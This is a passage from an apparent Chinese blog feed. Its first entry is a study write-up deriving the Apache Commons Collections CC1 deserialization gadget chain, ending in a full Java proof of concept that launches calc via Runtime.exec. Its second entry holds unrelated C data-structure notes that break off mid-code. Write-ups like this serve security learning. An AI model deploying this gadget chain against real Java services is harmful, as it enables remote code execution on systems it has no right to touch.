(input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var4) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist"); &#125; catch (IllegalAccessException var5) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed"); &#125; catch (InvocationTargetException var6) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6); &#125; &#125; &#125; 这个方法可以实现任意方法执行，通过传入一个对象，然后反射调用该对象的方法执行，通过查看该对象的构造方法，发现方法名、参数名可控。 12345public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; ​ 接下来通过该对象执行命令 12Runtime runtime = Runtime.getRuntime();new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;).transform(runtime); 寻找利用链刚刚是我自己调用了transform方法，接下来来看看有哪个方法中调用了transform。 点进transform方法，find Usages查看引用。 上面的21处都引用了transform方法，LazyMap和TransformedMap类都能可以利用，这里选择TransformedMap进行进一步利用。 在TransformedMap类中checkSetValue方法调用了transform方法。 接下来看看什么地方引用了checkSetValue方法。 在TransformedMap的父类AbstractInputCheckedMapDecorator找到 MapEntry 类的setValue中调用了checkSetValue。 怎么去执行这个setValue呢? 每个Entry其实就是每个(key,value)，通过for(Map.Entry entry:transformedMap.entrySet())去遍历每个Enety，就可以调用setValue方法，然后就会执行checkSetValue，进而调用transform方法执行命令。 123456789Runtime runtime = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;);HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put("key", "value");Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);for(Map.Entry entry:transformedMap.entrySet())&#123; entry.setValue(runtime);&#125; 目前为止，我们可以通过setValue方法设置map的值来触发命令执行。我们都知道反序列化会自动执行readObject方法，我们去查找哪个类的readObject方法引用了setValue方法。 有34处引用了setValue方法，看看有没有readObject方法引用setValue方法。 在AnnotationInvocationHandler类中的readObject方法调用了setValue。 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream"); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + "[" + value + "]").setMember( annotationType.members().get(name))); &#125; &#125; &#125; &#125; 看看这个类的构造方法 发现需要传入两个参数，一个需要传入一个注解，另一个个可以控制memberValues属性，而恰好就是通过该属性调用了setValue方法，这就很棒。 接下来创建该对象 1234Class&lt;?&gt; annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Override.class, transformedMap); 该类比较特殊，需要通过反射才能拿到，传入的是一个Override注解，这个注解在后面会有一个坑，待会调试后再来调整。 接下来对最终的AnnotationInvocationHandler对象进行序列化，然后再将其反序列化，看看是否可以成功执行刚刚构造的InvokerTransformer-&gt;transform。 1234567891011121314151617181920212223Runtime runtime = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;);HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put("key", "value");Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);Class&lt;?&gt; annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Override.class, transformedMap);// 序列化ByteArrayOutputStream barr = new ByteArrayOutputStream();ObjectOutputStream outputStream = new ObjectOutputStream(barr);outputStream.writeObject(o);System.out.println(barr);// 反序列化ByteArrayInputStream bais = new ByteArrayInputStream(barr.toByteArray());ObjectInputStream stream = new ObjectInputStream(bais);stream.readObject(); 发现执行后，只输出了序列化后的数据，并没有执行到命令，接下来打个断点进行调试下。 这里有个坑，就是断点打在上面这条语句是断不到的。 执行readObject方法的过程中，需要满足一个条件 memberType != null， 调试中memberType的值为null。 那么要怎么才能满足这个条件呢? 因为看源码比较绕，通过看p牛的文章结合自己的思考，直接给出条件。 在对AnnotationInvocationHandler初始化的时候，第一个参数需要传入一个注解，这个注解当中要有变量，对map进行赋值，它的key 要跟注解当中的变量同名。 12String name = memberValue.getKey(); // 拿到map的键名Class&lt;?&gt; memberType = memberTypes.get(name); // 在通过键名在注解中进行查找 最开始，传入的是Override.class 1Object o = constructor.newInstance(Override.class, transformedMap); 里面并没有定义任何变量，在Retention,发现一个value 接下来将Override.class替换成Retention.class Map的的键名改成value 123456789101112Runtime runtime = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;);HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put("value", "value");Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);Class&lt;?&gt; annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Retention.class, transformedMap); 再次进行调试 可以发现memberType已经不为空。 当我再次进行反序列化的时候，却报了个错 说的是exec 这个方法 在class sun.reflect.annotation.AnnotationTypeMismatchExceptionProxy不存在。 原因是Runtime 这个类并没有实现序列化接口，不能够直接进行序列化，需要进行反射调用。 12345678Transformer[] transformers = new Transformer[]&#123;new ConstantTransformer(Runtime.class),new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime",null&#125;),new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;)&#125;;ChainedTransformer transformer = new ChainedTransformer(transformers); 接下来，涉及到关键的三个类ChainedTransformer ConstantTransformer InvokerTransformer ChainedTransformer构造方法 构造方法的作用很简单，就是接收一个transformer数组，然后将该数组赋值给了类属性this.iTransformers。 transformer方法 这个方法的作用是遍历传入的transformer数组，里面保存的都是实现了transformer接口的对象，会挨个调用每个对象tranform方法，并且第一次调用后会将返回的结果作为下一个对象的参数再次调用。（放一张p牛的图） ConstantTransformer类构造方法 和 transform方法 这个类的构造方法会接收一个对象，并且将该对象赋值给this.iConstant，调用 transform方法就会返回该对象。上面代码传入的是Runtime.getRuntime()。执行transform方法后将得到一个Runtime类的实例。 InvokerTransformer类构造方法 transform方法 这个方法的功能是传入一个对象，然后通过反射拿到这个对象的类，在通过类拿到和方法名、参数类型拿到这个方法，在调用该方法。简单来说就是通过传入一个对象拿到指定方法，传指定参数进行调用，并且对象、方法名、参数都可控。 new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;}) 再回过头看看刚刚的代码 12345678Transformer[] transformers = new Transformer[]&#123;new ConstantTransformer(Runtime.class),new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime",null&#125;),new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;)&#125;;ChainedTransformer transformer = new ChainedTransformer(transformers); 只需要执行new ChainedTransformer(transformers).transform，就会将transformers数组中的四个对象链接起来，最后执行命令。 1234567891011121314151617// new ConstantTransformer(Runtime.class)Class input = Runtime.class;// new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime",null&#125;),Class cls = input.getClass();Method getMethod = cls.getMethod("getMethod", new Class[]&#123;String.class, Class[].class&#125;);Object getRuntime = getMethod.invoke(input, new Object[]&#123;"getRuntime",null&#125;);// new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;)Class cls1 = getRuntime.getClass();Method invoke = cls1.getMethod("invoke", new Class[]&#123;Object.class, Object[].class&#125;);Object invoke1 = invoke.invoke(getRuntime, new Object[]&#123;null, null&#125;);// new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;)&#125;;Class&lt;?&gt; cls2 = invoke1.getClass();Method exec = cls2.getMethod("exec", new Class[]&#123;String.class&#125;);exec.invoke(invoke1,"calc"); 用最笨的办法将上面的语句连接起来执行，最后成功执行了命令。 有点像俄罗斯套娃，利用反射获取反射。 完整利用链至此，一个完整的CC1利用链就构造完成了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class CC1 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime",null&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;) &#125;; ChainedTransformer transformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;(); map.put("value", "value"); Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, transformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Retention.class, transformedMap); UnSerializ(Serializ(o)); &#125; // 序列化 public static ByteArrayOutputStream Serializ(Object o) throws Exception &#123; // 序列化 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(barr); outputStream.writeObject(o); return barr; &#125; // 反序列化 public static void UnSerializ(ByteArrayOutputStream baos) throws Exception &#123; ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); &#125;&#125; 总结这条链对于我这种Java安全新手来说确实还是有很大难度，因为是第一次分析反序列化链条，后序还有很多链条会分析，所以就详细分析cc1，为之后分析打好基础，也陆陆续续分析了几天，踩了很多的坑，看了很多人的博客，理清楚每个知识点。其实这个过程还是很有意思的，再把整个过程总结出来，更能发现那些地方没搞懂。 参考文章&amp;视频https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/ https://www.yuque.com/tianxiadamutou/zcfd4v/hsh32p Java安全漫谈反序列化篇4 https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.1007.top_right_bar_window_history.content.click（流程清晰）]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>java安全漫谈</tag>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构学习笔记1]]></title>
    <url>%2F2022%2F03%2F10%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[根据郝斌老师的视频所做的一份笔记。 视频地址：https://www.bilibili.com/video/BV11s41167h6 老师讲得清晰易懂，非常推荐用来入门数据结构。 预备知识指针 指针的重要性 指针是C语言的灵魂 定义 地址 地址就是内存单元的编号 从0开始的非负整数 范围：0 - FFFFFFFF 指针 指针就是地址 地址就是指针 指针变量是存放内存单元地址的变量 指针的本质是一个操作受限的非负整数 分类 基本类型的指针 指针和数组的关系 结构体 为什么会出现结构体？ 为了表示一些复杂的数据，而普通的基本类型变量无法满足要求。 什么叫结构体 结构体是用户根据实际需要自己定义的复合数据类型 如何使用结构体 两种方式 12struct Student st = &#123;1000, &quot;lisi&quot;, 20&#125;;struct Student * pst = &amp;st; 通过结构体变量名来实现 st.sid 通过指向结构体变量的指针来实现【重点】 pst-&gt;sid pst所指向的结构体变量中的sid这个成员 注意事项 结构体变量不能加减乘除，但可以相互赋值 普通结构体变量和结构体指针变量作为函数传参的问题 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Student&#123; int sid; char name[200]; int age; &#125;;int main(void)&#123; struct Student st = &#123;100, "zhangsan", 23&#125;; printf("%d %s %d\n", st.sid, st.name, st.age); st.sid = 200; // st.name = "lisi"; strcpy(st.name, "lisi"); st.age = 25; printf("%d %s %d\n", st.sid, st.name, st.age); return 0;&#125; 动态内存的分配和释放 123456789101112131415161718192021222324252627282930313233# include &lt;stdio.h&gt;# include &lt;malloc.h&gt;int main(void)&#123; // 静态定义数组 int arr[5] = &#123;1,2,3,4,5&#125;; printf("%d\n", arr[0]); // 动态定义数组 int len; printf("请输入数组大小：\n"); scanf("%d", &amp;len); int *pArr = (int *)malloc(sizeof(int)*len); *pArr = 10; pArr[1] = 20; printf("%d\n", pArr[0]); printf("%d\n", pArr[1]); printf("数组长度：%d\n",len); // 输入 for(int i=0; i&lt;len; i++)&#123; scanf("%d", &amp;pArr[i]); &#125; // 输出 for(int i=0; i&lt;len; i++)&#123; printf("%d\n", pArr[i]); &#125; // 释放内存 free(pArr); return 0;&#125; 模块一线性结构[把所有的结点用一根直线穿起来] 连续存储 数组 什么叫数组 元素类型相同，大小相等 数组优缺点 优点： 存取速度快 缺点： 事先必须知道数组的长度 插入删除元素很慢 空间通常是有限制的 需要大块连续的内存块 数组的算法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110# include &lt;stdio.h&gt;# include &lt;malloc.h&gt; # include &lt;stdlib.h&gt;struct Arr&#123; int *pBase; // 存储数组第一个元素的地址 int len; // 存储数组长度 int cnt; // 存储当前数组有效的元素个数 &#125;;void init_arr(struct Arr *pArr, int length); // 初始化数组 bool append_arr(struct Arr *pArr, int val); // 追加 bool insert_arr(struct Arr *pArr, int pos, int val); // 插入 pos从1开始 bool delete_arr(); // 删除 int get(); // 获取 bool is_empty(struct Arr *pArr); // 是否为空 bool is_full(struct Arr *pArr); // 是否已满 void sort_arr(); // 排序 void show_arr(struct Arr *arr); // 查看数组 void inversion_arr(); // 逆序 int main(void)&#123; struct Arr arr; init_arr(&amp;arr, 6); show_arr(&amp;arr); for(int i=0; i&lt;5;i++)&#123; append_arr(&amp;arr, i); &#125; show_arr(&amp;arr); insert_arr(&amp;arr, 2, 99); show_arr(&amp;arr); printf("%d\n", arr.len); return 0;&#125;// 初始化 void init_arr(struct Arr *pArr, int length)&#123; pArr-&gt;pBase = (int *)malloc(sizeof(int) * length); if(NULL == pArr-&gt;pBase)&#123; printf("动态内存分配失败！\n"); exit(-1); &#125;else&#123; pArr-&gt;len = length; pArr-&gt;cnt = 0; &#125; return;&#125;// 判断数组是否为空bool is_empty(struct Arr * pArr)&#123; if(pArr-&gt;cnt == 0) return true; else return false; &#125;// 查看数组 void show_arr(struct Arr *pArr)&#123; if(is_empty(pArr))&#123; printf("数组为空！\n"); &#125;else&#123; for(int i=0; i&lt;pArr-&gt;cnt; i++)&#123; printf("%d\t", pArr-&gt;pBase[i]); &#125; printf("\n"); &#125;&#125;// 是否已满 bool is_full(struct Arr * pArr)&#123; if(pArr-&gt;len == pArr-&gt;cnt) return true; else return false; &#125;// 追加 bool append_arr(struct Arr * pArr, int val)&#123; // 判断是否已满 if(is_full(pArr)) return false; pArr-&gt;pBase[pArr-&gt;cnt] = val; pArr-&gt;cnt ++; return true; &#125;// 插入bool insert_arr(struct Arr * pArr, int pos, int val)&#123; if(is_full(pArr))&#123; return false; // 数组满了 &#125; if(pos&lt;1 || pos&gt;pArr-&gt;len+1)&#123; // 下标错误 或者 下标超过数组长度 错误 return false; &#125; for(int i = pArr-&gt;cnt-1; i&gt;=pos - 1; i--)&#123; pArr-&gt;pBase[i+1] = pArr-&gt;pBase[i]; &#125; pArr-&gt;pBase[pos-1] = val; (pArr-&gt;cnt)++; return true; &#125; 离散存储 链表定义 n个节点离散分配 彼此通过指针相连 每个节点只有一个前驱节点，每个节点只有一个后续节点 首节点没有前驱节点，尾节点没有后续节点 链表优缺点 优点： 空间没有限制 插入删除元素很快 缺点： 存取数据很慢 专业术语 首节点 第一个有效节点 尾节点 最后一个有效节点 头结点 头节点的数据类型和首节点类型一样 第一个有效节点之前的那个节点 头节点并不存放有效数据 加头节点的目的主要为了方便对链表的操作 头指针 指向头节点的指针变量 尾指针 指向尾节点的指针变量 如果希望通过一个函数来对链表进行处理，我们至少要接收链表的哪些参数？ 只需要一个参数：头指针 因为我们通过头指针可以推算出链表的其他所有参数 1234567891011# include &lt;stdio.h&gt;typedef struct Node&#123; int data; //数据域 struct Node * pNext;// 指针域 &#125;NODE, *PNODE; // NODE 等价于 struct Node ; *NODE 等价于 struct Node * int main(void)&#123; return 0;&#125; 分类 单链表 双链表 每个节点有两个指针域 循环链表 能通过任何一个节点找到其他节点 非循环链表 算法 遍历 查找 清空 销毁 求长度 排序 删除节点 1234p-&gt;pNext = p-&gt;pNext-&gt;pNext; // 存在内存泄露问题r = p-&gt;pNext;p-&gt;pNext = p-&gt;pNext-&gt;pNext;free(r); 插入节点 12q-&gt;pNext = p-&gt;pNext;p-&gt;pNext = q; 创建单链表 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# include &lt;stdio.h&gt;# include &lt;malloc.h&gt; typedef struct Node&#123; int data;// 数据域 struct Node * pNext; // 指针域 &#125;NODE, *PNODE;PNODE create_list(void);void traverse_list(PNODE pHead);int main(void)&#123; // 存放链表头结点 PNODE pHead; // 创建链表 pHead = create_list(); // 遍历链表 traverse_list(pHead); return 0;&#125;PNODE create_list(void)&#123; PNODE pHead = (PNODE)malloc(sizeof(PNODE)); int len; // 节点个数 int val; if(pHead == NULL)&#123; printf("动态创建内存失败！"); exit(-1); &#125; PNODE pTail = pHead; pTail-&gt;pNext = NULL; printf("请输入生成链表节点个数：\n"); scanf("%d", &amp;len); for(int i=0; i&lt;len; ++i)&#123; printf("请输入第%d个节点的值：\n", i+1); scanf("%d", &amp;val); // 创建节点 PNODE pNode = (PNODE)malloc(sizeof(PNODE)); if(pNode==NULL)&#123; printf("动态创建内存失败！"); exit(-1); &#125; // pNode-&gt;data = val; // pTail-&gt;pNext = pNode; // 给pNode-&gt;pNext 设置为尾结点 pNode-&gt;pNext = NULL; // 改变地址引用 pTail = pNode; // 问题：pTail = pNode这里会不会覆盖掉 pTail-&gt;pNext = pNode的赋值？ // 不会， pTail-&gt;pNext = pNode 是已经赋值完成，这里是将 pNode 地址赋值给 pTail // 并不会改变pTail-&gt;pNext 的值 &#125; return pHead; &#125; void traverse_list(PNODE pHead)&#123; PNODE p = pHead-&gt;pNext; while(p != NULL)&#123; printf("%d ", p-&gt;data); p = p-&gt;pNext; &#125; return;&#125; 单链表的算法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178# include &lt;stdio.h&gt;# include &lt;malloc.h&gt;typedef struct Node&#123; int val;// 数据域 struct Node * pNext; //指针域 &#125;NODE,*PNODE;PNODE create_list();void traverse_list(PNODE pHead);bool is_empty(PNODE pHead);int length_list(PNODE pHead);void sort_list(PNODE pHead);bool insert_list(PNODE pHead, int pos, int val); bool delete_list(PNODE pHead, int pos, int *pVal); int main(void)&#123; // 创建链表 PNODE pHead = create_list(); // 遍历链表 traverse_list(pHead); // 插入节点 insert_list(pHead, 4, 100); traverse_list(pHead); // 删除节点 int pVal; if(delete_list(pHead, 5, &amp;pVal))&#123; printf("删除成功，删除数据为%d\n", pVal); &#125; else&#123; printf("删除失败！"); &#125; traverse_list(pHead); // 判断链表是否为空 /* if(is_empty(pHead))&#123; printf("链表为空！\n"); &#125;else&#123; printf("链表不为空！\n"); &#125; */ // 返回链表长度 /* int len = length_list(pHead); printf("链表长度为：%d\n", len); */ // 对链表进行排序 //sort_list(pHead); //traverse_list(pHead); return 0;&#125; // 创建链表PNODE create_list()&#123; PNODE pHead = (PNODE)malloc(sizeof(NODE)); int len; int val; if(NULL == pHead)&#123; printf("内存分配失败！\n"); exit(-1); &#125; PNODE pTemp = pHead; pTemp-&gt;pNext = NULL; printf("请输入创建链表节点数：\n"); scanf("%d", &amp;len); for(int i=0; i&lt;len; i++)&#123; printf("请输入第%d个节点的值：\n", i+1); scanf("%d", &amp;val); // 创建节点 PNODE pNew = (PNODE)malloc(sizeof(NODE)); pNew-&gt;val = val; pTemp-&gt;pNext = pNew; pNew-&gt;pNext = NULL; pTemp = pNew; &#125; return pHead; &#125;// 遍历列表 void traverse_list(PNODE pHead)&#123; PNODE p = pHead-&gt;pNext; while(NULL != p)&#123; printf("%d ", p-&gt;val); p = p-&gt;pNext; &#125; printf("\n"); return;&#125;// 判断链表是否为空 bool is_empty(PNODE pHead)&#123; if(NULL == pHead-&gt;pNext) return true; else return false; &#125;// 返回链表长度 int length_list(PNODE pHead)&#123; PNODE p = pHead-&gt;pNext; int len = 0; while(NULL != p)&#123; len ++; p = p-&gt;pNext; &#125; return len;&#125;// 链表排序 void sort_list(PNODE pHead)&#123; /* for(i=0;i&lt;4;i++)&#123; for(j=i+1;j&lt;4-i;j++)&#123; if(arr[i]&gt;arr[j])&#123; t = arr[i]; arr[i] = arr[j]; arr[j] = t; &#125; &#125;*/ PNODE q,p; int i,j,t; int len = length_list(pHead); for(i=0,p=pHead-&gt;pNext; i&lt;len; i++, p=p-&gt;pNext)&#123; for(j=i+1;j&lt;len;j++)&#123; if(p-&gt;val &gt; p-&gt;pNext-&gt;val)&#123; // arr[i]&gt;arr[j] t = p-&gt;val; // t = arr[i] p-&gt;val = p-&gt;pNext-&gt;val; // arr[i] = arr[j] p-&gt;pNext-&gt;val = t; // arr[j] = t &#125; &#125; &#125;&#125;// 链表节点插入bool insert_list(PNODE pHead, int pos, int val)&#123; int i = 0; PNODE p = pHead; while(NULL!=p&amp;&amp;i&lt;pos-1)&#123; p = p-&gt;pNext; ++i; &#125; if(i&gt;pos-1||NULL==p) return false; // 实现插入节点 PNODE pNew = (PNODE)malloc(sizeof(NODE)); if(NULL==pNew)&#123; printf("动态分配内存失败！\n"); exit(-1); &#125; pNew-&gt;val = val; PNODE q = p-&gt;pNext; // 将下一个节点得指针 赋值给临时指针q p-&gt;pNext = pNew; // 将下一节点的指针指向新生成的节点 pNew-&gt;pNext = q; // 再将新生成的节点的指针域指向临时指针q return true; &#125; // 节点删除bool delete_list(PNODE pHead, int pos, int * pVal)&#123; PNODE p = pHead; int i = 0; while(NULL!=p-&gt;pNext&amp;&amp;i&lt;pos-1)&#123; p = p-&gt;pNext; i++; &#125; if(i&gt;pos-1||NULL==p-&gt;pNext)&#123; return false; &#125; // 实现删除节点 PNODE q = p-&gt;pNext; *pVal = q-&gt;val; p-&gt;pNext = p-&gt;pNext-&gt;pNext; free(q); return true; &#125; 线性结构-&gt;栈定义 一种可以实现”先进后出”的存储结 栈类似于箱子 分类 静态栈 动态栈 算法 出栈 入栈 应用 函数调用 中断 表达式求值 内存分配 缓冲处理 迷宫 栈算法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118# include &lt;stdio.h&gt;# include &lt;malloc.h&gt;typedef struct Node&#123; int data;// 数据域 struct Node * pNext; // 指针域 &#125;NODE,* PNODE; typedef struct Stack&#123; PNODE pTop;// 栈顶 PNODE pBottom;// 栈底 &#125;STACK,* PSTACK;void init_stack(PSTACK pS); // 初始化栈 void push(PSTACK pS, int val); // 入栈 void traverse_stack(PSTACK pS); // 遍历 bool is_empty(PSTACK pS); // 判断栈是否为空bool pop(PSTACK pS, int * val); // 出栈 void clean(PSTACK pS); // 清除栈 int main(void)&#123; STACK S; int val; init_stack(&amp;S); traverse_stack(&amp;S); push(&amp;S,1); push(&amp;S,2); push(&amp;S,3); traverse_stack(&amp;S); if(pop(&amp;S, &amp;val))&#123; printf("出栈成功，值为%d\n", val); &#125;else&#123; printf("出栈失败，栈为空\n"); &#125; //clean(&amp;S); traverse_stack(&amp;S); return 0;&#125;// 初始化栈 void init_stack(PSTACK pS)&#123; pS-&gt;pTop = (PNODE)malloc(sizeof(NODE)); if(pS-&gt;pTop == NULL)&#123; printf("动态内存分配失败!\n"); exit(-1); &#125;else&#123; pS-&gt;pBottom = pS-&gt;pTop; pS-&gt;pBottom-&gt;pNext = NULL; &#125; &#125;// 入栈 void push(PSTACK pS, int val)&#123; PNODE pNew = (PNODE)malloc(sizeof(NODE)); pNew-&gt;data = val; pNew-&gt;pNext = pS-&gt;pTop; pS-&gt;pTop = pNew; return;&#125;bool is_empty(PSTACK pS)&#123; if(pS-&gt;pTop == pS-&gt;pBottom)&#123; return true; &#125;else&#123; return false; &#125;&#125;// 遍历void traverse_stack(PSTACK pS)&#123; if(!is_empty(pS))&#123; // 非空 PNODE p = pS-&gt;pTop; while(p-&gt;pNext!=NULL)&#123; printf("%d ", p-&gt;data); p = p-&gt;pNext; &#125; printf("\n"); &#125;else&#123; printf("栈为空！\n"); &#125; &#125; // 出栈bool pop(PSTACK pS, int * val)&#123; if(!is_empty(pS))&#123; // 不为空 PNODE r = pS-&gt;pTop; * val = r-&gt;data; pS-&gt;pTop = r-&gt;pNext; free(r); r = NULL; return true; &#125;else&#123; // 栈为空 return false; &#125; &#125; // 清除栈void clean(PSTACK pS)&#123; if(!is_empty(pS))&#123; PNODE p = pS-&gt;pTop; PNODE q = NULL; // 不为空 while(p!=pS-&gt;pBottom)&#123; q = p-&gt;pNext; free(p); p = q; &#125; pS-&gt;pTop = pS-&gt;pBottom; &#125; return;&#125; 线性结构-&gt;队列定义 一种可以实现“先进先出”的存储结构 分类 链式队列 用链表实现 静态队列 用数组实现 静态队列通常必须是循环队列 静态队列为什么必须是循环队列 循环队列需要几个参数来确定 front real 循环队列各个参数的含义 2个参数不同场合有不同的含义 队列初始化 front 和 real 的值都是零 队列非空 front代表的是队列的第一个元素 rear代表的是队列的最后一个有效元素的下一个元素 队列空 font 和 real的值相等，但不一定是零 循环队列入队伪算法讲解 两步完成 将值存入r所代表的位置 错误的写法 r = r+1 正确的写法 r = (r+1)%数组的长度 循环队列出队伪算法讲解 front = （front+1）%数组的长度 如何判断循环队列是否为空 如果front与real的值相等，则该队列就一定为空 如何判断循环链表是否已满 预备知识 front的值可能比rear大 front的值也可能比real小 当然也可能两者相等 两种方式 多增加一个表标识参数 少用一个元素【通常使用第二种方式】 如果r和f值紧挨着，则队列已满 12345// C语言伪算法表示：if((r+1)%数组长度 == f) 已满else 未满 队列的算法 入队 出队 队列的具体应用 所有和时间有关的操作都有队列的影子 循环队列的实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121# include &lt;stdio.h&gt;# include &lt;malloc.h&gt;typedef struct Queue&#123; int * pBase; int front; int real; &#125;QUEUE;void init(QUEUE *); // 初始化队列bool en_queue(QUEUE *, int); // 入队 bool is_full(QUEUE *); // 判断队列是否已满void traverse_queue(QUEUE *); // 遍历队列bool is_empty(QUEUE *); // 判断队列是否为空bool out_queue(QUEUE *, int *); // 出队 int main(void)&#123; QUEUE Q; int val; init(&amp;Q); en_queue(&amp;Q, 1); en_queue(&amp;Q, 2); en_queue(&amp;Q, 3); en_queue(&amp;Q, 4); en_queue(&amp;Q, 5); en_queue(&amp;Q, 6); en_queue(&amp;Q, 7); en_queue(&amp;Q, 8); traverse_queue(&amp;Q); out_queue(&amp;Q, &amp;val); out_queue(&amp;Q, &amp;val); if(out_queue(&amp;Q, &amp;val))&#123; printf("出队成功， 出队的值为%d\n", val); &#125;else&#123; 